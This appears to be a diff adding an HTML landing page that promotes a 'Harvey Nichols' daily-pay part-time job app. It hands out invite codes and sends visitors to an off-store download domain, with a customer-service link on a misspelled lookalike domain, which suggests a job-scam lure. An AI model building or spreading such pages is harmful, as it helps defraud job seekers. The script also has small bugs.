@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="../css/ifarm.css">
+    <link rel="stylesheet" href="../icontont/iconfont.css">
+    <title>夏菲尼高</title>
+</head>
+
+<body>
+    <section id="app">
+        <div class="header">
+            <img src="../img/2-2.png" alt="">
+        </div>
+        <div onclick="downLoad()" class="gif_img">
+            <img src="../img/load.gif" alt="">
+            <div class="gif_img_text_ab"><i class="iconfont icon-xiazai"></i> 下载APP 即刻报名</div>
+        </div>
+        <div class="content">
+            <div class="inv_code">
+                <div>邀请码 ：</div>
+                <div onclick="copy()" id="code"></div>
+            </div>
+            <img src="../img/2-1.png" alt="">
+            <div onclick="downLoad()" class="conten_text_common conten_text_ab1">立即下载</div>
+            <div onclick="downLoad()" class="conten_text_common conten_text_ab2">立即下载</div>
+            <div onclick="downLoad()" class="conten_text_common conten_text_ab3">立即下载</div>
+        </div>
+        <video width="100%" src="../video/IMG_0298.MP4" controls="controls" type="video/mp4" autoplay="autoplay"
+            loop="loop" muted="muted"></video>
+        <!-- autoplay自动播放 controls播放控件 loop循环播放 poster加载等待画面 muted 静音播放(解决谷歌禁用自动播放) -->
+        <!-- <div class="video"> -->
+        <!-- <video width="100%"   >
+                <source src="../video/IMG_0298.MP4" type="video/mp4">
+            </video> -->
+        <!-- </div> -->
+        <div class="footer_fixed">
+            <div class="down_img_box">
+                <img src="../img/logo-red.png" alt="">
+            </div>
+            <div class="down_content">
+                <div style="font-size: 16px;">夏菲尼高日结兼职</div>
+                <div style="font-size: 14px;margin: 3px 0;">想兼职赚钱，就来夏菲尼高</div>
+                <div style="font-size: 12px;">大小:47.3MB 版本:2.0.7</div>
+            </div>
+            <div class="down_btn" onclick="downLoad()"> <i class="iconfont icon-xiazai"></i> <span>立即下载</span></div>
+        </div>
+        <div onclick="chatofkefu()" class="kehu">
+            <i class="iconfont icon-kefu1"></i>
+            <div>客服</div>
+        </div>
+
+        <div class="dialog" id="dialog">
+            <div class="dialog_title">邀请码已复制</div>
+            <div class="dialog_info">安装APP后，注册时粘贴邀请码</div>
+            <div onclick="downLoadByInvCode()" class="dialog_down">安装</div>
+        </div>
+
+    </section>
+</body>
+<script src="../js/axios.js"></script>
+
+<script>
+    const dislog = document.getElementById('dialog')
+    const code = document.getElementById('code')
+    // 普通下载
+    function downLoad() {
+        //打开新页面
+        // window.open("https://down.harveynichols-global.com") 
+        //原页面跳转        
+        window.location.href = 'https://down.harveynichols-global.com'
+    }
+    // 邀请码下载
+    function downLoadByInvCode() {
+        dislog.style.display = "none"
+        window.location.href = 'https://down.harveynichols-global.com'
+    }
+    function browserRedirect() {
+        const app = document.getElementById('app')
+        var sUserAgent = navigator.userAgent.toLowerCase();
+        var bIsIpad = sUserAgent.match(/ipad/i) == "ipad";
+        var bIsIphoneOs = sUserAgent.match(/iphone os/i) == "iphone os";
+        var bIsMidp = sUserAgent.match(/midp/i) == "midp";
+        var bIsUc7 = sUserAgent.match(/rv:1.2.3.4/i) == "rv:1.2.3.4";
+        var bIsUc = sUserAgent.match(/ucweb/i) == "ucweb";
+        var bIsAndroid = sUserAgent.match(/android/i) == "android";
+        var bIsCE = sUserAgent.match(/windows ce/i) == "windows ce";
+        var bIsWM = sUserAgent.match(/windows mobile/i) == "windows mobile";
+        if (bIsIphoneOs || bIsIpad) {
+            app.style.width = '375px'
+        } else if (bIsMidp || bIsUc7 || bIsUc || bIsAndroid || bIsCE || bIsWM) {
+            app.style.width = '375px'
+        } else {
+            app.style.width = '400px'
+        }
+    }
+    // 获取客服端类型
+    browserRedirect()
+
+    // 联系客服
+    function chatofkefu() {
+        window.location.href = 'https://chat.harveynechols.com/index/index/home?visiter_id=&visiter_name=&avatar=&business_id=1&groupid=0&special=1'
+    }
+    // 生产随机数
+    const randomNum = (min, max) => Math.floor(Math.random() * (max - min + 1)) + min;
+    // 请求获取邀请码
+    async function getCodeList() {
+        const { data: res } = await axios.get('/admin/codeList')
+        if (res.cdoe == 200) {
+            code.innerText = res.data[randomNum(0, res.data.length)].val
+        }
+    }
+    getCodeList()
+    // 点击邀请码复制
+    function copy() {
+        if (!code.innerText) return // 防止复制到空内容
+        let input = document.createElement("input"); // 复制的容器
+        input.value = code.innerText;
+        document.body.appendChild(input);
+        input.select();  // 选中输入框中的内容
+        document.execCommand("copy"); // 复制动作
+        document.body.removeChild(input);
+        dislog.style.display = 'flex'
+
+    }
+</script>
+
+</html>
